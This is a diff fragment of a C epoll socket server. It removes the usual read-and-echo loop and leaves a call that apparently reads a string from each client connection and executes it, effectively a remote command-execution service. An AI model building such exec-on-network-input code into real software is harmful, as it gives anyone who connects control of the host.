@@ -289,51 +289,6 @@ int main(int argc, char *argv[]) {
                    completely, as we are running in edge-triggered mode
                    and won't get a notification again for the same
                    data. */
-                int done = 0;
-
-                while (1)
-                {
-                    ssize_t count;
-                    char buf[512];
-
-                    count = read (events[i].data.fd, buf, sizeof buf);
-                    if (count == -1)
-                    {
-                        /* If errno == EAGAIN, that means we have read all
-                           data. So go back to the main loop. */
-                        if (errno != EAGAIN)
-                        {
-                            perror ("read");
-                            done = 1;
-                        }
-                        break;
-                    }
-                    else if (count == 0)
-                    {
-                        /* End of file. The remote has closed the
-                           connection. */
-                        done = 1;
-                        break;
-                    }
-
-                    /* Write the buffer to standard output */
-                    int s = write (1, buf, count);
-                    if (s == -1)
-                    {
-                        perror ("write");
-                        abort ();
-                    }
-                }
-
-                if (done)
-                {
-                    printf ("Closed connection on descriptor %d\n",
-                            events[i].data.fd);
-
-                    /* Closing the descriptor will make epoll remove it
-                       from the set of descriptors which are monitored. */
-                    close (events[i].data.fd);
-                }
                     //Read string and exec it
                     int code = read_and_exec(events[i].data.fd, STDOUT_FILENO);
                     if (code < 0) {
